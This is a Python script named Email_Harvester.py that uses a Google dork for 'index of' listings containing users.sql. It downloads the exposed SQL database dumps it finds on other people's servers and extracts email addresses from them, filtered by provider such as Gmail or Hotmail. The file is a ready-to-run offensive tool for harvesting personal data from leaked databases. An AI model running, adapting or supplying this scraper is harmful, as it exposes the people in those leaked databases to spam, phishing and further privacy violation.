#!/usr/bin/env python3

'''
Installation:
pip3 install requests
pip3 install git+https://github.com/abenassi/Google-Search-API

Windows:
py Email_Harvester.py -h

Mac & Linux
python3 Email_Harvester.py -h

Example:
python3 Email_Harvester.py --hotmail --live --gmail --yahoo --level 10
'''
import os, sys, socket, requests, re, argparse
from google import google

global collect
global links
global queries
collect = []
links = []
queries = ['intitle:"index of" "users.sql"']
c = 0

regex = '^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$'

def parse_args():
    banner = '''
    ______
    | ___ \\
    | |_/ /_   _
    | ___ \\ | | |
    | |_/ / |_| |
    \\____/ \\__, |
            __/ |
           |___/
        _____ _         ______           _  ______
       |_   _| |        | ___ \\         | ||___  /
         | | | |__   ___| |_/ /___  __ _| |   / /  ___ _____ __  _______
         | | | '_ \\ / _ \\    // _ \\/ _` | |  / /  / _ \\_  / '_ \\|_  / _ \\
         | | | | | |  __/ |\ \  __/ (_| | |./ /__|  __// /| | | |/ / (_) |
         \\_/ |_| |_|\\___\\_| \\_\\___|\\__,_|_|\\_____/\\___/___|_| |_/___\\___/
                    [GitHub]                            [TWITTER]
             https://github.com/leonv024             @TheRealZeznzo
    '''

    parser = argparse.ArgumentParser(prog="Email_Harvester.py",
    formatter_class=argparse.RawDescriptionHelpFormatter,
    description='''\
                Example: Email_Harvester.py --hotmail --live --gmail --yahoo --level 10
                        ------------------------------------------------
%s''' % banner)

    # Global
    parser.add_argument("-hm", "--hotmail", action="store_true",help="Show @hotmail.com only")
    parser.add_argument("-li", "--live", action="store_true",help="Show @live.com only")
    parser.add_argument("-gm", "--gmail", action="store_true",help="Show @gmail.com only")
    parser.add_argument("-yh", "--yahoo", action="store_true",help="Show @yahoo.com only")
    parser.add_argument("-lv", "--level", help="Max pages to search")
    return parser.parse_args()

args = parse_args()

v = []
if args.hotmail:
    v.append('@hotmail.com')
if args.live:
    v.append('@live.com')
if args.gmail:
    v.append('@gmail.com')
if args.yahoo:
    v.append('@yahoo.com')

if len(v) == 0:
    v.append('')

if not args.level:
    args.level = 1

def check(email):
    global c

    e = []
    for i in e:
        if not i == email:
            pass
        else:
            e.append(email)

    if(re.search(regex,email)):
        print(u"[Valid Email Found] \u2192 Num. [%i] %s  %s" % (int(c), '\u2192'.rjust(10), email))
        c +=1
    else:
        #print("Invalid Email: %s" % email)
        pass

print('Dorking...')

global r
for i in queries:
    r = google.search(i, int(args.level))

print('Collecting SQL databases...')

for i in range(0, len(r)):
    links.append(r[i].link + 'users.sql')

for i in links:
    try:
        d = requests.get(i)

        if d.status_code == 200:
            print('[Database Found!] %s' % i)
            collect.append(d.text)
    except Exception as e:
        pass


print('Validating...')

for i in collect:
    emails = i.replace("'", '').replace(")", '').replace(";", '').replace('/', '').split(',')
    for address in emails:
        if '@' in address:
            if '\\n' in address:
                address = address.split('\\n')[0]
            if address.endswith('.'):
                address = address[:-1]

            for item in v:
                if address.endswith(item):
                    check(address.strip())
sys.exit(0)
